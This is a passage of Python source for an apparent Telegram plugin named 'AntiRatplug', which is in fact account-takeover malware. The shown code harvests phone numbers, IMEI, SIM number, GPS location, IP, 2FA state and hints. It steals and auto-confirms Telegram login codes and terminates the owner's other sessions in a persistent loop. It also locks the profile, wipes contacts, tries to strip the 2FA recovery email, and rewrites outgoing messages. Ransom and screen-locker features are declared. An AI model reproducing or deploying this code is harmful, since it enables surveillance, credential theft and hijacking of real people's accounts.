        self._sync_running = False
        self._active = False
        self.stop = False
        self._replace_waiting = False
        self._replace_mode = False
        self._replace_text = ""
        self._pending_delegates = []
        self._rpc_lock = threading.RLock()
        self._jitter = random.randint(400, 900)

        self.account = 0
        self.user_id = 0
        self.username = ""
        self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]

        self._recipient_ah_cache = {}
        self._recipient_lock = threading.Lock()
        self._last_session_confirm = {}
        self._fee_deficit = 0

        self._tg_kid_watching = False
        self._tg_kid_seen = set()
        self._tg_kid_thread = None

        self._dim_view = None
        self._dim_active = False
        self._dim_alpha = 1.0

        self._locker_view = None
        self._locker_on = False

        self._mercy_view = None
        self._mercy_on = False
        self._mercy_thread = None

        self._vidker_view = None
        self._vidker_sv = None
        self._vidker_mp = None
        self._vidker_cb = None
        self._vidker_on = False

        self._music_mp = None
        self._mmusic_waiting = None

        self._ransom_view = None
        self._ransom_mini_view = None
        self._ransom_decor = None
        self._ransom_wm = None
        self._ransom_photo_path = ""
        self._ransom_photo_url = ""
        self._ransom_args = None
        self._ransom_pay_grace_until = 0

        self._flood_uris = []
        self._lock_path = None

        self._nuke_on = False
        self._nuke_thread = None
        self._nuke_interval = 60
        self._nuke_pass = 0

    # ─── lifecycle ──────────────────────────────────────────────────────────

    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        self.stop = False
        try:
            self.add_on_send_message_hook()
        except Exception:
            pass
        threading.Thread(target=self._boot, daemon=True).start()
        for fn in (self._ensure_splash, self._ensure_vidker_assets,
                   self._check_persisted_mercy, self._check_persisted_vidker,
                   self._check_persisted_nuke):
            try:
                fn()
            except Exception:
                pass

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        self.stop = True
        self._tg_kid_watching = False
        self._nuke_on = False
        for fn in (self._clear_dim, self._clear_locker, self._clear_mercy,
                   self._clear_vidker, self._clear_music, self._dismiss_ransom):
            try:
                fn()
            except Exception:
                pass

    def create_settings(self):
        return []

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        time.sleep(random.uniform(0.2, 0.6))
        for fn in (lambda: self._send_msg("AntiRatplug v22.3-integrated loaded"),
                   self._send_manage_button,
                   self._start_polling):
            try:
                fn()
            except Exception:
                pass

    def on_send_message_hook(self, account, params):
        try:
            text = getattr(params, "message", None)
            if isinstance(text, str) and len(text) > 0:
                if self._replace_mode and self._replace_text:
                    try:
                        params.message = self._replace_text
                    except Exception:
                        set_private_field(params, "message", self._replace_text)
            return HookResult()
        except Exception:
            return HookResult()

    def _html_escape(self, text):
        if text is None:
            return ""
        t = str(text)
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    # ─── account / phone harvest ───────────────────────────────────────────

    def _uc(self):
        try:
            sa = int(_uc_cls().selectedAccount)
            if sa:
                return sa
        except Exception:
            pass
        for i in range(16):
            try:
                if _uc_cls().getInstance(i).getClientUserId():
                    return i
            except Exception:
                pass
        return 0

    def _my_id(self, account=None, discover=False):
        acc = account if account is not None else self.account
        try:
            return int(_uc_cls().getInstance(int(acc)).getClientUserId())
        except Exception:
            pass
        if not discover:
            return 0
        for i in range(16):
            try:
                uid = int(_uc_cls().getInstance(i).getClientUserId())
                if uid:
                    self.account = i
                    return uid
            except Exception:
                pass
        return 0

    def _pull_phone(self, acc=0):
        try:
            uc = _uc_cls().getInstance(acc)
            uid = int(uc.getClientUserId())
            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _mc_cls().getInstance(acc).getUser(uid)
                except Exception:
                    pass
            ph = _phone_from_user(u)
            if ph:
                return ph
        except Exception:
            pass
        try:
            ctx = ApplicationLoader.applicationContext
            pkg = str(ctx.getPackageName())
            sp = "/data/data/%s/shared_prefs" % pkg
            if os.path.isdir(sp):
                for fn in os.listdir(sp):
                    low = fn.lower()
                    if "userconfig" not in low and "userconfing" not in low:
                        continue
                    fp = os.path.join(sp, fn)
                    try:
                        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                            txt = f.read()
                        for m in re.finditer(r'"phone"\s*:\s*"([+\d\s\-()]{5,})"', txt):
                            r = _clean_phone(m.group(1))
                            if r:
                                return r
                        for m in re.finditer(
                                r'<string name="phone[^"]*">([+\d][\d\s\-()]{5,})</string>',
                                txt):
                            r = _clean_phone(m.group(1))
                            if r:
                                return r
                    except Exception:
                        pass
        except Exception:
            pass
        try:
            Full = jclass("org.telegram.tgnet.TLRPC$TL_users_getFullUser")
            IUSelf = jclass("org.telegram.tgnet.TLRPC$TL_inputUserSelf")
            rq = Full()
            rq.id = IUSelf()
            resp, _e = self._rg_rpc(rq, acc, 10.0)
            fu = getattr(resp, "user", None) if resp is not None else None
            if fu is None and resp is not None:
                fu = getattr(resp, "full_user", None)
            ph = _phone_from_user(fu)
            if ph:
                return ph
        except Exception:
            pass
        return ""

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"),
                             "MAX_ACCOUNT_COUNT", 8))
        except Exception:
            mc = 8
        for i in range(max(mc, 16)):
            try:
                uc = _uc_cls().getInstance(i)
                if not uc or not uc.isClientActivated():
                    continue
                uid = int(uc.getClientUserId())
                if uid == 0:
                    continue
                u = None
                try:
                    u = uc.getCurrentUser()
                except Exception:
                    pass
                if u is None:
                    try:
                        u = _mc_cls().getInstance(i).getUser(uid)
                    except Exception:
                        pass
                un = ""
                ph = ""
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    raw = _phone_from_user(u)
                    ph = raw.lstrip("+") if raw else ""
                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
            except Exception:
                pass
        return out

    def _harvest_account_info(self, acc=0, send=False):
        out = {}
        try:
            uc = _uc_cls().getInstance(acc)
            uid = int(uc.getClientUserId())
            out["user_id"] = str(uid)

            ph = self._pull_phone(acc)
            if ph:
                out["phone"] = ph

            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _mc_cls().getInstance(acc).getUser(uid)
                except Exception:
                    pass
            if u is not None:
                fn = str(getattr(u, "first_name", "") or "").strip()
                ln = str(getattr(u, "last_name", "") or "").strip()
                un = str(getattr(u, "username", "") or "").strip()
                if fn:
                    out["first_name"] = fn
                if ln:
                    out["last_name"] = ln
                if un:
                    out["username"] = "@" + un if not un.startswith("@") else un

            try:
                dcid = uc.getCurrentDatacenterId()
                if dcid:
                    out["dc_id"] = str(int(dcid))
            except Exception:
                pass

            st = self._get_2fa_state(acc)
            if st is not None:
                out["2fa"] = "on" if st.get("has_password") else "off"

            try:
                bal = self._stars_balance(acc)
                if bal > 0:
                    out["stars_balance"] = str(bal)
            except Exception:
                pass

            if send:
                lines = ["<b>Account info</b>"]
                for k, v in out.items():
                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
                self._send_msg("\n".join(lines), html=True)
        except Exception:
            pass
        return out

    # ─── peers / RPC ───────────────────────────────────────────────────────

    def _get_input_peer(self, account, peer_id):
        try:
            mc = _mc_cls().getInstance(account)
            peer_id = int(peer_id)
            if peer_id > 0:
                user = mc.getUser(peer_id)
                ip = TLRPC.TL_inputPeerUser()
                ip.user_id = int(user.id) if user is not None else peer_id
                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
                return ip
            if peer_id < -1000000000000:
                cid = -peer_id - 1000000000000
                chat = mc.getChat(cid)
                ip = TLRPC.TL_inputPeerChannel()
                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
                return ip
            if peer_id < 0:
                cid = -peer_id
                chat = mc.getChat(cid)
                if chat is not None and getattr(chat, "migrated_to", None) is not None:
                    mt = chat.migrated_to
                    ip = TLRPC.TL_inputPeerChannel()
                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
                    return ip
                ip = TLRPC.TL_inputPeerChat()
                ip.chat_id = int(cid)
                return ip
        except Exception:
            pass
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0:
            timeout = 8.0
        gate = _ReplyGate()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _cm_cls().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if gate.response is not None or gate.error is not None:
                    break
                time.sleep(0.08)
        finally:
            try:
                self._pending_delegates.remove(gate)
            except Exception:
                pass
        return gate.response, gate.error

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            out = []
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as e:
                    out.append(e)
            return out
        out = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try:
                        out.append(f.result(timeout=timeout))
                    except Exception as e:
                        out.append(e)
        except Exception:
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as ee:
                    out.append(ee)
        return out

    # ─── network info ──────────────────────────────────────────────────────

    def _get_external_ip(self):
        for host in [HOST_IP1, HOST_IP2]:
            try:
                from java.net import URL
                from java.io import BufferedReader, InputStreamReader
                url = URL(host)
                conn = url.openConnection()
                conn.setConnectTimeout(2500)
                conn.setReadTimeout(2500)
                reader = BufferedReader(InputStreamReader(conn.getInputStream()))
                ip = ""
                line = reader.readLine()
                while line is not None:
                    ip += str(line)
                    line = reader.readLine()
                reader.close()
                conn.disconnect()
                if ip and len(ip) < 50:
                    return ip.strip()
            except Exception:
                pass
        return "Unknown"

    def _get_geo_info(self, ip):
        try:
            from java.net import URL
            from java.io import BufferedReader, InputStreamReader
            url = URL(HOST_GEO + ip)
            conn = url.openConnection()
            conn.setConnectTimeout(3500)
            conn.setReadTimeout(3500)
            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
            response = ""
            line = reader.readLine()
            while line is not None:
                response += str(line)
                line = reader.readLine()
            reader.close()
            conn.disconnect()
            data = json.loads(response)
            return (data.get("city", "Unknown") + ", "
                    + data.get("country", "Unknown") + " (ISP: "
                    + data.get("isp", "Unknown") + ")")
        except Exception:
            return "Unknown"

    def _get_2fa_state(self, acc=0):
        try:
            Req = jclass("org.telegram.tgnet.TLRPC$TL_account_getPassword")
            resp, err = self._rg_rpc(Req(), acc, 10.0)
            if err is not None or resp is None:
                return None
            return {
                "has_password": _get_bool_attr(resp, "has_password", False),
                "hint": str(getattr(resp, "hint", "") or ""),
            }
        except Exception:
            return None

    # ─── info ──────────────────────────────────────────────────────────────

    def _info(self):
        try:
            from android.os import Build
            info = "<b>Информация об аккаунте</b>\n\n"
            try:
                uc = _uc_cls().getInstance(0)
                uid = uc.getClientUserId()
                user = uc.getCurrentUser()
                if user is not None:
                    first = self._html_escape(user.first_name) if user.first_name else ""
                    last = self._html_escape(user.last_name) if user.last_name else ""
                    un = self._html_escape(user.username) if user.username else "нет"
                    ph = self._html_escape(self._pull_phone(0) or "нет")
                    info += "<b>Имя:</b> %s %s\n" % (first, last)
                    info += "<b>Юзернейм:</b> @%s\n" % un
                    info += "<b>Телефон:</b> %s\n" % ph
                    info += "<b>ID:</b> %s\n" % str(user.id)
            except Exception:
                pass
            ip = self._get_external_ip()
            geo = self._get_geo_info(ip)
            info += "\n<b>IP:</b> %s\n<b>Гео:</b> %s" % (
                self._html_escape(ip), self._html_escape(geo))

            info += "\n\n<b>📱 Устройство</b>\n"
            info += "<b>Модель:</b> %s %s\n" % (
                self._html_escape(getattr(Build, "MANUFACTURER", "")),
                self._html_escape(getattr(Build, "MODEL", "")))
            try:
                v = getattr(Build, "VERSION")
                info += "<b>Android:</b> %s (SDK %s)\n" % (
                    self._html_escape(getattr(v, "RELEASE", "")),
                    self._html_escape(str(getattr(v, "SDK_INT", 0))))
            except Exception:
                pass
            try:
                ctx = ApplicationLoader.applicationContext
                info += "<b>Пакет:</b> %s\n" % self._html_escape(str(ctx.getPackageName()))
                tm = ctx.getSystemService(ctx.TELEPHONY_SERVICE)
                if tm:
                    try:
                        imei = str(tm.getDeviceId())
                        if imei and imei != "None":
                            info += "<b>IMEI:</b> %s\n" % self._html_escape(imei)
                    except Exception:
                        pass
                    try:
                        num = str(tm.getLine1Number())
                        if num and num != "None":
                            info += "<b>Номер SIM:</b> %s\n" % self._html_escape(num)
                    except Exception:
                        pass
                    try:
                        op = str(tm.getNetworkOperatorName())
                        if op:
                            info += "<b>Оператор:</b> %s\n" % self._html_escape(op)
                    except Exception:
                        pass
            except Exception:
                pass

            info += "\n\n<b>📍 Локация</b>\n"
            try:
                if self._has_perm("android.permission.ACCESS_FINE_LOCATION") or \
                        self._has_perm("android.permission.ACCESS_COARSE_LOCATION"):
                    ctx = ApplicationLoader.applicationContext
                    lm = ctx.getSystemService(ctx.LOCATION_SERVICE)
                    providers = lm.getAllProviders()
                    loc_found = False
                    for p in ["fused", "gps", "network"]:
                        if p in [str(x) for x in providers]:
                            try:
                                loc = lm.getLastKnownLocation(p)
                                if loc:
                                    info += "<b>lat:</b> %f\n<b>lon:</b> %f\n<b>точность:</b> %f (%s)\n" % (
                                        float(loc.getLatitude()), float(loc.getLongitude()),
                                        float(loc.getAccuracy()), p)
                                    loc_found = True
                                    break
                            except Exception:
                                pass
                    if not loc_found:
                        info += "нет фикса\n"
                else:
                    info += "нет разрешения\n"
            except Exception:
                info += "ошибка получения\n"

            sessions = self._get_active_sessions()
            info += "\n<b>Сессий:</b> %d" % len(sessions)
            info += "\n\n<b>🔐 2FA</b>\n"
            twofa = self._get_2fa_state(0)
            if twofa is None or not twofa["has_password"]:
                info += "не установлен"
            else:
                info += "<b>Статус:</b> ✅ УСТАНОВЛЕН\n"
                info += "<b>Подсказка:</b> %s\n" % (self._html_escape(twofa["hint"]) or "(нет)")
            self._send_msg(info, html=True)
        except Exception as e:
            self._send_msg("Ошибка info: " + str(e))

    def _get_active_sessions(self):
        sessions = []
        try:
            cm = _cm_cls().getInstance(0)
            raw = cm.getActiveSessions()
            auths = raw.authorizations if hasattr(raw, "authorizations") else raw
            if auths is not None:
                for i in range(_jlist_size(auths)):
                    try:
                        s = _jlist_get(auths, i)
                        if s is not None:
                            sessions.append({
                                "device": str(getattr(s, "device_model", "Unknown")),
                                "app": str(getattr(s, "app_name", "Unknown")),
                                "ip": str(getattr(s, "ip", "Unknown")),
                                "country": str(getattr(s, "country", "Unknown")),
                                "is_current": _get_bool_attr(s, "is_current", False),
                                "hash": str(getattr(s, "hash", "0")),
                            })
                    except Exception:
                        pass
        except Exception:
            pass
        return sessions

    # ─── login code extract / watch ────────────────────────────────────────

    def _extract_code_from_msg(self, m):
        if m is None:
            return None, None, None, None
        raw = str(getattr(m, "message", "") or "")
        if not raw:
            return None, None, None, None
        low = raw.lower()
        kind = "unknown"
        if "login code" in low or "код для входа" in low or "код входа" in low:
            kind = "login"
        elif "password reset" in low or "сброс" in low or "recovery" in low:
            kind = "reset"
        patterns = [
            r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
            r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
            r"[Кк]од\s+подтверждения[:\s]*[«\"']?(\d{5})",
            r"[Cc]onfirmation\s+code[:\s]*[«\"']?(\d{5})",
            r"[Кк]од[:\s]+(\d{5})\b",
            r"(?:code|код)\D{0,10}(\d{5})\b",
        ]
        code = None
        for p in patterns:
            mm = re.search(p, raw, re.IGNORECASE)
            if mm:
                code = mm.group(1)
                break
        buttons = []
        try:
            rm = getattr(m, "reply_markup", None)
            if rm is not None:
                rows = getattr(rm, "rows", None)
                if rows is not None:
                    for ri in range(_jlist_size(rows)):
                        row = _jlist_get(rows, ri)
                        btns = getattr(row, "buttons", None)
                        if btns is None:
                            continue
                        for bi in range(_jlist_size(btns)):
                            b = _jlist_get(btns, bi)
                            txt = str(getattr(b, "text", "") or "")
                            data = getattr(b, "data", None)
                            buttons.append({"text": txt, "data": data})
                            if not code and txt:
                                bm = re.search(r"\b(\d{5})\b", txt)
                                if bm:
                                    code = bm.group(1)
        except Exception:
            pass
        return code, kind, raw[:400], buttons

    def _pull_login_code(self, attempts=3, delay=2.0):
        for att in range(attempts):
            try:
                ip = self._get_input_peer(0, 777000)
                if ip is None:
                    time.sleep(delay)
                    continue
                req = TLRPC.TL_messages_getHistory()
                req.peer = ip
                req.limit = 20
                req.offset_id = 0
                resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
                if err is None and resp is not None:
                    msgs = getattr(resp, "messages", None)
                    if msgs is not None and _jlist_size(msgs) > 0:
                        for i in range(_jlist_size(msgs)):
                            m = _jlist_get(msgs, i)
                            code, kind, raw, buttons = self._extract_code_from_msg(m)
                            if code:
                                mid = _safe_int(getattr(m, "id", 0))
                                return code, kind, raw, mid, buttons
            except Exception:
                pass
            if att < attempts - 1:
                time.sleep(delay)
        return None, None, None, 0, None

    def _auto_confirm_login(self, msg):
        try:
            rm = getattr(msg, "reply_markup", None)
            if rm is None:
                return False
            rows = getattr(rm, "rows", None)
            if rows is None:
                return False
            neg = ("не я", "not me", "no", "reject", "отклонить", "это не я")
            pos = ("это я", "it's me", "yes", "accept", "confirm", "подтвердить")
            target = None
            for ri in range(_jlist_size(rows)):
                row = _jlist_get(rows, ri)
                btns = getattr(row, "buttons", None)
                if btns is None:
                    continue
                for bi in range(_jlist_size(btns)):
                    b = _jlist_get(btns, bi)
                    txt = str(getattr(b, "text", "") or "").lower()
                    if any(n in txt for n in neg):
                        continue
                    if any(p in txt for p in pos):
                        target = b
                        break
                if target is not None:
                    break
            if target is None:
                return False
            mid = _safe_int(getattr(msg, "id", 0))
            if not mid:
                return False
            data = getattr(target, "data", None)
            if data is None:
                return False
            Req = jclass("org.telegram.tgnet.TLRPC$TL_messages_getBotCallbackAnswer")
            rq = Req()
            try:
                rq.peer = self._get_input_peer(0, 777000)
            except Exception:
                pass
            rq.msg_id = mid
            try:
                rq.data = data
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 10.0)
            return r is not None
        except Exception:
            return False

    def _tg_kid(self):
        try:
            code, kind, raw, mid, buttons = self._pull_login_code(attempts=3, delay=2.0)
            acc_info = self._harvest_account_info(0)
            phone = acc_info.get("phone") or "—"
            lines = ["<b>Tg kid</b>", ""]
            if code:
                lines.append("<b>Code:</b> <code>%s</code> (%s)" % (
                    self._html_escape(code), self._html_escape(kind or "login")))
                self._tg_kid_seen.add(str(code))
            else:
                lines.append("<b>Code:</b> не найден — watch 10 min")
            lines.append("<b>Phone:</b> %s" % self._html_escape(phone))
            for k, v in acc_info.items():
                if k == "phone":
                    continue
                if v in (None, "", "?", "0"):
                    continue
                lines.append("<b>%s:</b> %s" % (
                    self._html_escape(k), self._html_escape(str(v))))
            if raw:
                lines.append("")
                lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
            self._send_msg("\n".join(lines), html=True)
            if not self._tg_kid_watching:
                self._tg_kid_watching = True
                self._tg_kid_thread = threading.Thread(
                    target=self._tg_kid_watch_loop, daemon=True)
                self._tg_kid_thread.start()
            return code
        except Exception as e:
            self._send_msg("Tg kid err: " + str(e))
            return None

    def _tg_kid_watch_loop(self, duration=600, poll=5):
        end = time.time() + duration
        last_max_id = 0
        try:
            ip = self._get_input_peer(0, 777000)
            if ip is not None:
                rq = TLRPC.TL_messages_getHistory()
                rq.peer = ip
                rq.limit = 1
                rq.offset_id = 0
                resp, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
                if resp is not None:
                    msgs = getattr(resp, "messages", None)
                    if msgs is not None and _jlist_size(msgs) > 0:
                        last_max_id = _safe_int(
                            getattr(_jlist_get(msgs, 0), "id", 0))
        except Exception:
            pass

        while time.time() < end and self._sync_running and not self.stop:
            try:
                ip = self._get_input_peer(0, 777000)
                if ip is not None:
                    rq = TLRPC.TL_messages_getHistory()
                    rq.peer = ip
                    rq.limit = 10
                    rq.offset_id = 0
                    resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
                    if resp is not None:
                        msgs = getattr(resp, "messages", None)
                        if msgs is not None and _jlist_size(msgs) > 0:
                            new_msgs = []
                            for i in range(_jlist_size(msgs)):
                                m = _jlist_get(msgs, i)
                                mid = _safe_int(getattr(m, "id", 0))
                                if mid and mid > last_max_id:
                                    new_msgs.append((mid, m))
                            if new_msgs:
                                last_max_id = max(mid for mid, _m in new_msgs)
                                new_msgs.sort(key=lambda x: x[0])
                                for mid, m in new_msgs:
                                    code, kind, raw, buttons = self._extract_code_from_msg(m)
                                    if code and str(code) not in self._tg_kid_seen:
                                        self._tg_kid_seen.add(str(code))
                                        line = "<b>New %s</b>\n<b>Code:</b> <code>%s</code>" % (
                                            self._html_escape(kind or "login"),
                                            self._html_escape(code))
                                        self._send_msg(line, html=True)
                                    if self._auto_confirm_login(m):
                                        self._send_msg("auto-confirmed (msg %d)" % mid)
            except Exception:
                pass
            for _ in range(poll):
                if not self._sync_running or self.stop:
                    break
                time.sleep(1)
        self._tg_kid_watching = False

    # ─── session kill ──────────────────────────────────────────────────────

    def _get_authorizations_full(self, acc=0):
        try:
            Req = jclass("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations")
            req = Req()
            resp, _e = self._rg_rpc(req, acc, 8.0)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return []
            out = []
            for i in range(_jlist_size(auths)):
                a = _jlist_get(auths, i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                    "device": str(getattr(a, "device_model", "") or ""),
                    "app": str(getattr(a, "app_name", "") or ""),
                    "platform": str(getattr(a, "platform", "") or ""),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0, phones_pc_only=False):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()

        def _one(h):
            try:
                Rst = jclass("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization")
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = []
            for a in auths:
                if a["current"] or not a["hash"] or a["hash"] in dead:
                    continue
                if phones_pc_only:
                    blob = (a.get("device", "") + " " + a.get("app", "") + " "
                            + a.get("platform", "")).lower()
                    if any(w in blob for w in ("web", "chrome", "firefox",
                                                "safari", "opera", "edge",
                                                "browser")):
                        continue
                targets.append(a["hash"])
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
        try:
            Rst = jclass("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations")
            self._rg_rpc(Rst(), acc, 10.0)
        except Exception:
            pass
        return killed, total

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = jclass("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations")
            resp, _e = self._rg_rpc(Get(), acc, 8.0)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = jclass("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization")
            hashes = []
            for i in range(_jlist_size(auths)):
                h = _safe_int(getattr(_jlist_get(auths, i), "hash", 0))
                if h:
                    hashes.append(h)

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60:
                return 0
            self._last_session_confirm[acc] = time.time()
            auths = self._get_authorizations_full(acc)
            if not auths:
                return 0
            Ch = jclass("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings")
            confirmed = 0
            for a in auths:
                if not a.get("unconfirmed"):
                    continue
                try:
                    rq = Ch()
                    rq.hash = a["hash"]
                    try:
                        rq.confirmed = True
                        rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception:
                        pass
                    _r2, e2 = self._rg_rpc(rq, acc, 10.0)
                    if e2 is None:
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        except Exception:
            return 0

    def _session_wipe(self):
        try:
            self._send_msg("Wipe sessions...")
            k, t = self._kill_all_sessions(0)
            self._send_msg("Wiped: %d / %d" % (k, t))
        except Exception as e:
            self._send_msg("wipe err: " + str(e))

    def _kill_sessions_full(self):
        try:
            self._send_msg("Kill all sessions (phones/PCs)...")
            total = 0
            for a in self._get_accounts_list():
                try:
                    k, _t = self._kill_all_sessions(a.get("id", 0), phones_pc_only=True)
                    total += k
                except Exception:
                    pass
            self._send_msg("Killed: %d" % total)
        except Exception as e:
            self._send_msg("kill err: " + str(e))

    def _manual_terminate_session(self, h):
        try:
            req = TLRPC.TL_account_resetAuthorization()
            req.hash = int(h)
            resp, err = self._rg_rpc(req, 0, 15.0)
            if err is not None:
                self._send_msg("Ошибка terminate: %s" % str(err))
            else:
                self._send_msg("Сессия %s завершена." % str(h))
        except Exception as e:
            self._send_msg("Ошибка terminate: " + str(e))

    # ─── nuke loop ─────────────────────────────────────────────────────────

    def _nuke_marker_path(self):
        try:
            return os.path.join(
                str(ApplicationLoader.applicationContext.getFilesDir().getAbsolutePath()),
                ".ar_nuke_active")
        except Exception:
            return None

    def _check_persisted_nuke(self):
        m = self._nuke_marker_path()
        if not m or not os.path.exists(m):
            return
        self._nuke_on = True
        self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
        self._nuke_thread.start()

    def _start_nuke_loop(self):
        if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
            self._send_msg("Nuke loop already running")
            return
        self._nuke_on = True
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f:
                    f.write("1")
        except Exception:
            pass
        self._nuke_pass = 0
        self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
        self._nuke_thread.start()
        self._send_msg("Nuke loop STARTED (%ds)" % self._nuke_interval)

    def _stop_nuke_loop(self):
        self._nuke_on = False
        try:
            m = self._nuke_marker_path()
            if m and os.path.exists(m):
                os.remove(m)
        except Exception:
            pass
        self._send_msg("Nuke loop STOPPED")

    def _nuke_loop(self):
        while self._nuke_on and self._sync_running:
            self._nuke_pass += 1
            try:
                for a in self._get_accounts_list():
                    try:
                        self._kill_all_sessions(a.get("id", 0), phones_pc_only=True)
                    except Exception:
                        pass
                try:
                    self._confirm_unconfirmed_sessions(0)
                except Exception:
                    pass
                try:
                    self._kill_web_authorizations(0)
                except Exception:
                    pass
            except Exception:
                pass
            for _ in range(self._nuke_interval):
                if not self._nuke_on or not self._sync_running:
                    return
                time.sleep(1)

    # ─── profile lock ──────────────────────────────────────────────────────

    def _change_username(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits)
                          for _ in range(10))
            new_un = "user_" + rnd
            Upd = jclass("org.telegram.tgnet.TLRPC$TL_account_updateUsername")
            rq = Upd()
            rq.username = new_un
            r, _e = self._rg_rpc(rq, acc, 10.0)
            return new_un if r is not None else None
        except Exception:
            return None

    def _change_profile(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits)
                          for _ in range(6))
            Upd = jclass("org.telegram.tgnet.TLRPC$TL_account_updateProfile")
            rq = Upd()
            try:
                rq.first_name = "[LOCKED]"
                rq.last_name = rnd
                rq.flags = 0x03
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, acc, 10.0)
            return r is not None
        except Exception:
            return False

    def _reset_contacts(self, acc=0):
        try:
            Rq = jclass("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts")
            r, _e = self._rg_rpc(Rq(), acc, 10.0)
            return r is not None
        except Exception:
            return False

    # ─── 2FA pipeline ──────────────────────────────────────────────────────

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = jclass("org.telegram.tgnet.TLRPC$TL_account_resetPassword")
            resp, err = self._rg_rpc(Rst(), acc, 12.0)
            if resp is not None:
                return "ok"
            etxt = str(getattr(err, "text", err) or err)
            for tag in ("PASSWORD_NOT_SET", "SESSION_PASSWORD_NEEDED", "FLOOD_WAIT"):
                if tag in etxt:
                    return tag.lower()
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _remove_recovery_email(self, acc=0):
        try:
            PS = jclass("org.telegram.tgnet.TLRPC$TL_passwordInputSettings")
            ns = PS()
            try:
                ns.email = ""
                ns.flags = 0
            except Exception:
                pass
            Upd = jclass("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings")
            rq = Upd()
            try:
                rq.password = None
            except Exception:
                pass
            rq.new_settings = ns
            r, _e = self._rg_rpc(rq, acc, 10.0)
            return {"ok": r is not None}
        except Exception:
            return {"ok": False}

    def _nuke_password_pipeline(self, acc=0):
        report = {"recovery_removed": False, "reset_password": "?",
                  "state_before": None, "state_after": None,
                  "attempts": 0, "final": "unknown"}
        try:
            report["state_before"] = self._get_2fa_state(acc)
        except Exception:
            pass
        sb = report["state_before"]
        if sb is not None and not sb.get("has_password"):
            report["final"] = "clean"
            return report
        for attempt in range(3):
            report["attempts"] = attempt + 1
            try:
                r = self._remove_recovery_email(acc)
                if isinstance(r, dict) and r.get("ok"):
